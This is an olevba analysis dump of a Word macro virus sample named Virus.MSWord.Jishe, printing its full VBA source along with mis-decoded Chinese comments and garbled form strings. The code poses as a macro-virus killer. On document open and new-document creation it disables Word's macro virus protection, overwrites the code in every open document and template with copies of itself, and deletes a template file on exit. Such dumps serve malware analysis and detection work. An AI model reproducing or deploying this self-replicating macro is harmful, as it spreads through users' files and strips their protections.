olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'ŐâĘÇ±ľČËŃ§Ď°ÖĆ×÷µÄŇ»¸öşę˛ˇ¶ľ·ŔÉ±łĚĐň,ËüżÉŇÔ·ŔÖą˛ż·ÖWORDşę˛ˇ¶ľµÄ¸ĐČľ
'ŐâĐčŇŞÓĐ´óÁżµÄşę˛ˇ¶ľĚŘŐ÷Âë×÷ÎŞŇŔľÝ,ČçąűÄă·˘ĎÖÓĐ±ľŇßĂçÎŢÄÜÎŞÁ¦µÄşę˛ˇ¶ľ
'¸ĐĐ»ÄúĽ°Ę±ÓëÎŇÁŞĎµ,ÄăŇ˛żÉŇÔ×ÔŃˇĐŢ¸Ä±ľłĚĐň,ŇÔĽÓÇż±ľŇßĂçµÄą¦Á¦
'Óë˛ˇ¶ľ×÷¶·ŐůľÍČçÍ¬µÖÓůÉç»á·¸×ď,ĐčŇŞ´óĽŇµÄą˛Í¬Ĺ¬Á¦
'»¶Ó­ĽÓČëĆäÖĐ˛˘łÉÎŞŇ»ĂűŐ˝Ęż,Ň˛ĐíÄăŐýĘÇ´óĽŇĆÚ´ýŇŃľĂµÄÓÂĘż
'łĚĐňÉčĽĆ: Ľ˝É÷»Ş
'°ěą«µç»°:
'ŇÁĂĂµŘÖ·: club@263.net
Option Explicit 'łĚĐňÖĐµÄ±äÁż±ŘĐëĎČ¶¨ŇĺşóĘąÓĂ
Const answer0 = "FreeWordMacroVirusKiller" '±ŁłÖÓëŇÔÇ°°ć±ľµÄĽćČÝĐÔ
Const answer1 = "MyMacroVirusKillerV1.0"
Const answer2 = "MyMacroVirusKillerV2.0" '±ľłĚĐň±ęÖľ
'Version 2.0
Private Sub Document_Open()
    CloseVirusProtection
    'Ľě˛é´ňżŞµÄÎÄµµÖĐĘÇ·ńÓĐ˛ˇ¶ľ
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO JiShenhua.bas 
in file: Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07 - OLE stream: 'Macros/VBA/JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'ŐâĘÇ±ľČËŃ§Ď°ÖĆ×÷µÄŇ»¸öşę˛ˇ¶ľ·ŔÉ±łĚĐň,ËüżÉŇÔ·ŔÖą˛ż·ÖWORDşę˛ˇ¶ľµÄ¸ĐČľ
'ŐâĐčŇŞÓĐ´óÁżµÄşę˛ˇ¶ľĚŘŐ÷Âë×÷ÎŞŇŔľÝ,ČçąűÄă·˘ĎÖÓĐ±ľŇßĂçÎŢÄÜÎŞÁ¦µÄşę˛ˇ¶ľ
'¸ĐĐ»ÄúĽ°Ę±ÓëÎŇÁŞĎµ,ÄăŇ˛żÉŇÔ×ÔŃˇĐŢ¸Ä±ľłĚĐň,ŇÔĽÓÇż±ľŇßĂçµÄą¦Á¦
'Óë˛ˇ¶ľ×÷¶·ŐůľÍČçÍ¬µÖÓůÉç»á·¸×ď,ĐčŇŞ´óĽŇµÄą˛Í¬Ĺ¬Á¦
'»¶Ó­ĽÓČëĆäÖĐ˛˘łÉÎŞŇ»ĂűŐ˝Ęż,Ň˛ĐíÄăŐýĘÇ´óĽŇĆÚ´ýŇŃľĂµÄÓÂĘż
'łĚĐňÉčĽĆ: Ľ˝É÷»Ş
'°ěą«µç»°:
'ŇÁĂĂµŘÖ·: club@263.net
Option Explicit 'łĚĐňÖĐµÄ±äÁż±ŘĐëĎČ¶¨ŇĺşóĘąÓĂ
Public pVirusReport As String '˛ˇ¶ľĂčĘöĐĹĎ˘
Private Const cMyID As String = "MyMacroVirusKillerV2.0" '±ľłĚĐň´úÂë±ęÖľ
Private Const cMyModule As String = "JiShenhua" '±ľłĚĐňµÄÄŁżéĂűłĆ
Private Const cMyUserForm As String = "VirusReport" '±ľłĚĐňµÄÓĂ»§´°żÚĂűłĆ
Private Const cOK As Integer = 0 'Ň»ÇĐŐýłŁ
Private Const cDocHasModuleElse As Integer = 1 'ÓĐĆäËűÄŁżé´ćÔÚ
Private Const cDocHasCodeElse As Integer = 2 'ÔÚThisDocumentÄŁżéÖĐÓĐĆäËű´úÂë´ćÔÚ
Private Const cDocHasAllElse As Integer = 3 'ÔÚThisDocumentÄŁżéÖĐÓĐĆäËű´úÂë´ćÔÚŁ¬˛˘ÓĐĆäËűÄŁżé´ćÔÚ
Private Const cDocProtected As Integer = 4 '¸ĂÎÄµµ±»±Ł»¤
'´ňżŞÎÄµµĘ±×Ô¶ŻÖ´ĐĐ
Sub AutoOpen()
    CloseVirusProtection
    'Ľě˛é´ňżŞµÄÎÄµµÖĐĘÇ·ńÓĐ˛ˇ¶ľ,ČçąűÓĐ˛ˇ¶ľŁ¬ĎňÓĂ»§Ěáłö±¨¸ć
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
'ĐÂ˝¨ÎÄµµĘ±×Ô¶ŻÖ´ĐĐ
Sub AutoNew()
    CloseVirusProtection
    Infect Word.ActiveDocument
End Sub
'ąŘ±ŐWORDÖ®Ç°ÇĺŔíautoexec.dotÎÄĽţÖĐµÄ˛ˇ¶ľ
Sub AutoExit()
    Const AutoDotFile = "C:\AUTOEXEC.DOT"
    If Dir(AutoDotFile) <> "" Then
        Kill AutoDotFile
    End If
End Sub
'´ÓÖ¸¶¨ÎÄĽţÖĐĎňËůÓĐ´ňżŞÎÄµµĽ°ÄŁ°ĺÖĐ¸´ÖĆ±ľłĚĐň´úÂëĽ°ÄŁżé
Public Function InfectAll() As Boolean
    Dim myDoc As Document, myTemp As Template
    'Ďň´ňżŞµÄÎÄµµÖĐĐ´Čë±ľ´úÂë
    For Each myDoc In Documents
        Infect myDoc
    Next myDoc
    'ĎňWORDÄŁ°ĺÖĐĐ´Čë±ľ´úÂë
    For Each myTemp In Templates
        Infect myTemp
    Next myTemp
    InfectAll = True
End Function
'ÇĺłýËůÓĐ´ňżŞÎÄµµĽ°ÄŁ°ĺÖĐµÄ˛ˇ¶ľÄŁżéĽ°´úÂë
Public Function ClearVirus() As Boolean
    Dim i As Integer
    Dim myDoc As Document, myTemp As Template
    Dim Cleared As Boolean

    ClearVirus = True
    'Ľě˛éËůÓĐÎÄµµ˛˘Çĺłý
    For Each myDoc In Documents
        Cleared = ClearDocument(myDoc)
        If Not Cleared Then
            MsgBox "˛ˇ¶ľÇĺłýą¤×÷˛»łÉą¦Ł¬ÇëĽě˛éÔ­ŇňˇŁ", vbOKOnly, myDoc.Name
            ClearVirus = False
        End If
    Next myDoc
    'Ľě˛éËůÓĐÄŁ°ĺ˛˘Çĺłý
    For Each myTemp In Templates
        Cleared = ClearDocument(myTemp)
        If Not Cleared Then
            MsgBox "˛ˇ¶ľÇĺłýą¤×÷˛»łÉą¦Ł¬ÇëĽě˛éÔ­ŇňˇŁ", vbOKOnly, myTemp.Name
            ClearVirus = False
        End If
    Next myTemp
End Function
'Ľě˛éËůÓĐ´ňżŞµÄÎÄµµĽ°ÄŁ°ĺÖĐĘÇ·ńÓĐ˛ˇ¶ľ´ćÔÚŁ¬ČçąűÓĐŁ¬·µ»Ř˛ˇ¶ľĐĹĎ˘ĂčĘö×Ö·ű´®
Public Function ScanVirus() As Boolean
    Dim DocsCount As Integer, i As Integer, ret As Integer
    Dim myStr As String
    Dim myDoc As Document, myTemp As Template
    
    ScanVirus = False
    pVirusReport = ""
    'Ľě˛éËůÓĐ´ňżŞµÄÎÄµµÖĐĘÇ·ńÓĐ˛ˇ¶ľ
    For Each myDoc In Documents
        ret = ScanDocument(myDoc)
        Select Case ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "şŻĘýScanDocument·µ»Ř´íÎó´úÂëŁ¬ĎµÍłÎŢ·¨Ę¶±đˇŁ", vbOKOnly, "ĎµÍłłö´í"
        End Select
    Next myDoc
    'Ľě˛éËůÓĐÄŁ°ĺ
    For Each myTemp In Templates
        ret = ScanDocument(myTemp)
        Select Case ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "şŻĘýScanDocument·µ»Ř´íÎó´úÂëŁ¬ĎµÍłÎŢ·¨Ę¶±đˇŁ", vbOKOnly, "ĎµÍłłö´í"
        End Select
    Next myTemp
End Function
'ąŘ±ŐWordşę˛ˇ¶ľ±Ł»¤ą¦ÄÜ
Public Function CloseVirusProtection(Optional Protected As Boolean = False)
    Options.VirusProtection = Protected
End Function
'°Ń±ľłĚĐň´úÂë´ÓŇ»¸öÎÄĽţ¸´ÖĆµ˝ÁíŇ»¸öÎÄĽţÖĐ
Private Function Infect(TargetFile) As Boolean
    Dim xItem, CommandStr As String, file As String
    Dim myDoc As Document, myTemp As Template
    Dim LinesofCode As Long, myStr As String
    
    'Ľě˛é˛ÎĘýŔŕĐÍĘÇ·ńŐýČ·
    myStr = TypeName(TargetFile)
    If myStr <> "Document" And myStr <> "Template" Then
        MsgBox "ĘąÓĂĘýľÝŔŕĐÍ" + myStr + "µ÷ÓĂşŻĘýInfectŁ¬ĎµÍłÖ»ÔĘĐíĘąÓĂDocumentĽ°TemplateŔŕĐÍˇŁ", vbOKOnly, "ĎµÍł´íÎó"
        Infect = False
        Exit Function
    End If
    Infect = True
    If TargetFile.Name = ThisDocument.Name Then Exit Function 'Äż±ęÎÄĽţÓëÔ´ÎÄĽţĎŕÍ¬Ę±˛»Ö´ĐĐĐ´Čë˛Ů×÷
    If Infected(TargetFile) Then Exit Function 'Äż±ęÎÄĽţŇŃľ­´ćÔÚ±ľłĚĐň´úÂë
    If TargetFile.VBProject.Protection Then Exit Function 'Äż±ęÎÄĽţ±»±Ł»¤Ł¬˛»ÄÜÖ´ĐĐĐ´Čë˛Ů×÷
    Infect = False
    
    'ÇĺłýÄż±ęÎÄµµÖĐŇŃľ­´ćÔÚµÄĆäËűÄŁżéĽ°´úÂë
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.CodeModule.CountOfLines
            If LinesofCode > 0 Then xItem.CodeModule.DeleteLines 1, LinesofCode
        Else
            TargetFile.VBProject.VBComponents.Remove xItem
        End If
    Next xItem
    
    'ĎňÎÄµµÖĐĐ´Čë±ľłĚĐň´úÂëĽ°ÄŁżé
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyModule, TargetFile.FullName + ":" + cMyModule
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyUserForm, TargetFile.FullName + ":" + cMyUserForm

    ' ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^
    
    '¸ĂłĚĐň¶ÎČçąű·ĹÔÚÇ°Á˝¸öÓďľäÖ®Ç°Ł¬ľÍ»áµĽÖÂVBA32.DLLłĚĐňłöĎÖÖÂĂü´íÎó¶řËŔ»úŁ¬
    'ÇîÎŇÖ®±ĎÉú±ŕłĚľ­ŃéŁ¬˛»ÖŞşÎąĘŁ¬ĚěÄÄŁˇĚěŔíşÎÔÚŁż
    
    LinesofCode = ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
    myStr = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(1, LinesofCode)
    TargetFile.VBProject.VBComponents(1).CodeModule.InsertLines 1, myStr
    
    Infect = True
End Function
'Ľě˛éÖ¸¶¨ÎÄµµÖĐĘÇ·ńŇŃľ­ÓĐ±ľłĚĐň´úÂë
Private Function Infected(TargetFile)
    Dim xItem, LinesofCode As Integer
    Dim HasVirus As Integer
    Dim myType As String
    
    myType = TypeName(TargetFile)
    If myType <> "Document" And myType <> "Template" Then
        MsgBox "ĘąÓĂĘýľÝŔŕĐÍ" + myType + "µ÷ÓĂşŻĘýInfectedŁ¬ĎµÍłÖ»ÔĘĐíĘąÓĂDocumentĽ°TemplateŔŕĐÍˇŁ", vbOKOnly, "ĎµÍł´íÎó"
        Infected = True
        Exit Function
    End If
    
    'Ľě˛éÄż±ęÎÄµµĘÇ·ń±»±Ł»¤
    If TargetFile.VBProject.Protection Then
        Infected = True
        Exit Function
    End If
    
    'µ±ThisDocument,myModule,myUserFormľů´ćÔÚĘ±Ł¬±íĘľ¸ĂÎÄĽţŇŃľ­±»¸ĐČľ
    HasVirus = 0
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.CodeModule.CountOfLines
            If (LinesofCode > 0) And (xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                HasVirus = HasVirus Or 1
            End If
        ElseIf xItem.Name = cMyModule Then
            HasVirus = HasVirus Or 2
        ElseIf xItem.Name = cMyUserForm Then
            HasVirus = HasVirus Or 4
        End If
    Next xItem
    If HasVirus = 7 Then
        Infected = True
    Else
        Infected = False
    End If
End Function
'Ľě˛éÖ¸¶¨µÄ´ňżŞÎÄµµĽ°ÄŁ°ĺÖĐĘÇ·ńÓĐ˛ˇ¶ľ´ćÔÚ
Private Function ScanDocument(myDocOrTemp) As Integer
    Dim xItem, i As Integer, myStr As String
    Dim LinesofCode As Integer
    
    ScanDocument = cOK
    'Ľě˛é˛ÎĘýŔŕĐÍĘÇ·ńŐýČ·
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "µ÷ÓĂşŻĘýScanDocumentÖ»ÄÜĘąÓĂDocumentĽ°TemplateĘýľÝŔŕĐÍˇŁ", vbOKOnly, "ĎµÍł´íÎó"
        Exit Function
    End If
    myStr = myDocOrTemp.Name + "Ľě˛é˝áąűŁş" + Chr(10)
    'Ľě˛éłĚĐňÄŁżéĘÇ·ń±»±Ł»¤
    If myDocOrTemp.VBProject.Protection Then
        ScanDocument = cDocProtected
        myStr = myStr + "  ÎÄĽţÖĐµÄłĚĐň´úÂë±»±Ł»¤Ł¬ĎµÍłÎŢ·¨×Ô¶Ż˛éÉ±Ł¬µ«Ň˛żÉÄÜ´ćÔÚ˛ˇ¶ľŁ¬ÇëĐˇĐÄŁˇ" + Chr(10)
        Exit Function
    End If
    For Each xItem In myDocOrTemp.VBProject.VBComponents
        If (xItem.Name = "ThisDocument") Then
            '´Ë˛ż·ÖÓĐ´úÂëĘ±Ł¬ČçąűŐŇ˛»µ˝±ľÄŁżé±ęÖľÔňČĎ¶¨ÎŞ˛ˇ¶ľ
            LinesofCode = xItem.CodeModule.CountOfLines
            If (LinesofCode > 0) And (Not xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                ScanDocument = ScanDocument Or cDocHasCodeElse
                myStr = myStr + "  <" + xItem.Name + ">¶ÔĎóÖĐÓĐĆäËűłĚĐň´ćÔÚŁ¬´ó¸ĹĘÇ˛ˇ¶ľˇŁ" + Chr(10)
            End If
        ElseIf (xItem.Name <> cMyModule) And (xItem.Name <> cMyUserForm) Then
            'ÎÄµµÖĐłý±ľÄŁżé´úÂëÖ®ÍâŁ¬Čçąű»ąÓĐĆäËü´úÂëÔňČĎ¶¨ÎŞ˛ˇ¶ľ
            ScanDocument = ScanDocument Or cDocHasModuleElse
            myStr = myStr + "  ÓĐĆäËűÄŁżé<" + xItem.Name + ">´ćÔÚŁ¬Ľ«ÓĐżÉÄÜĘÇ˛ˇ¶ľˇŁ" + Chr(10)
        End If
    Next
    If ScanDocument = cOK Then myStr = myStr + "  Ă»ÓĐ˛ˇ¶ľŁ¬Çë·ĹĐÄĘąÓĂˇŁ" + Chr(10)
    pVirusReport = pVirusReport + myStr
End Function
'ÇĺłýÖ¸¶¨µÄ´ňżŞÎÄµµĽ°ÄŁ°ĺÖĐµÄ˛ˇ¶ľÄŁżéĽ°´úÂë
Private Function ClearDocument(myDocOrTemp) As Boolean
    Dim xItem, LinesofCode As Integer
    
    ClearDocument = False
    'Ľě˛é˛ÎĘýŔŕĐÍĘÇ·ńŐýČ·
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "µ÷ÓĂşŻĘýClearDocumentÖ»ÄÜĘąÓĂDocumentĽ°TemplateĘýľÝŔŕĐÍˇŁ", vbOKOnly, "ĎµÍł´íÎó"
        Exit Function
    End If
    If myDocOrTemp.VBProject.Protection Then
        ClearDocument = True
        Exit Function
    End If
    'Ľě˛éÎÄµµĘÇ·ńÓĐ˛ˇ¶ľ
    If ScanDocument(myDocOrTemp) Then
        For Each xItem In myDocOrTemp.VBProject.VBComponents
            If xItem.Name = "ThisDocument" Then
                LinesofCode = xItem.CodeModule.CountOfLines
                If (LinesofCode > 0) And (Not xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                    xItem.CodeModule.DeleteLines 1, LinesofCode
                End If
            ElseIf xItem.Name <> cMyModule And xItem.Name <> cMyUserForm Then
                myDocOrTemp.VBProject.VBComponents.Remove xItem
            End If
        Next
    End If
    ClearDocument = True
End Function
-------------------------------------------------------------------------------
VBA MACRO VirusReport.frm 
in file: Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07 - OLE stream: 'Macros/VBA/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

























'´°ĚĺłĚĐň´úÂë
Option Explicit 'łĚĐňÖĐµÄ±äÁż±ŘĐëĎČ¶¨ŇĺşóĘąÓĂ
'´ňżŞ´°ĚĺĘ±Ö´ĐĐµÄ˛Ů×÷
Private Sub UserForm_Initialize()
    CheckBox1.Value = True
    Information.Value = pVirusReport
    Beep
End Sub
'ąŘ±Ő´°ĚĺŁ¬˛»×÷ČÎşÎ´¦Ŕí
Private Sub CommandButtonNothing_Click()
    Dim ret As Integer
    ret = MsgBox("ÁěµĽŁ¬ËäČ»ÄăżÉÄÜ»áĹúĆŔÎŇŁ¬µ«»ąĘÇŇŞ¸ćËßÄăŁ¬ŐâŃů×öĘÇşÜÎŁĎŐµÄˇŁĘÇ·ńŐćµÄ˛»×ö´¦ŔíŁ¬ÇëĹúĘľˇŁ", vbYesNo + vbDefaultButton2, "ÔŮ´Î±¨¸ćŁˇ")
    If ret = vbYes Then
        Unload Me
    End If
End Sub
'´ňżŞVisulBasic±ŕĽ­Ć÷
Private Sub CommandButtonOpenVisubasic_Click()
    ShowVisualBasicEditor = True
End Sub
'É±˛ˇ¶ľ
Private Sub CommandButtonKill_Click()
    If ClearVirus Then
        ResetMenu
        InfectAll
        Unload Me
        MsgBox "°´ŐŐÄúµÄÖ¸ĘľŁ¬ÎŇŇŃľ­°ŃżÉÄÜĘÇ˛ˇ¶ľµÄ¶«¶«Č«˛żÇĺŔíÍę±ĎŁ¬˛»ąýŇ˛żÉÄÜşĂĐÄ°ěÁË»µĘÂŁ¬ÄÇżÉ˛»ŇŞąÖÎŇÓ´ˇŁ", vbOKOnly, "±¨¸ćŁˇ"
    Else
        MsgBox "˛»ÖŞĘ˛Ă´Ô­ŇňŁ¬Çĺłý˛ˇ¶ľą¤×÷˛»łÉą¦Ł¬ÇëÄúĘÖą¤Ľě˛é»ňÓëÎŇÁŞĎµˇŁ", vbOKOnly, "Ľ˝É÷»ŞĎňÄú±¨¸ćŁş"
        Unload Me
    End If
End Sub
'»Ö¸´±»˛ˇ¶ľ¸ü¸ÄµÄ˛ËµĄĎî
Private Function ResetMenu()
    Dim mItem, cItem, myKey As KeyBinding
    
    CustomizationContext = NormalTemplate
    'Alt+F8:´ňżŞşę¶Ô»°żň
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    'Alt+F11:´ňżŞVisualBasic±ŕĽ­Ć÷
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyH)).Clear
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyK)).Clear

    '»Ö¸´ą¤ľß˛ËµĄµÄÔ­ĘĽÉčÖĂ
    For Each mItem In CommandBars("Tools").Controls
        mItem.Reset
    Next mItem
    For Each cItem In CommandBars("Visual Basic").Controls
        cItem.Reset
    Next cItem
    For Each cItem In CommandBars
        If cItem.Visible = True Then
            cItem.Protection = msoBarNoProtection
        End If
    Next cItem
End Function
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`�ʓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN 'Virus.MSWord.Jishe-9c08de75fc992ac31b6f29f9a3d84175d8eb0d07' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
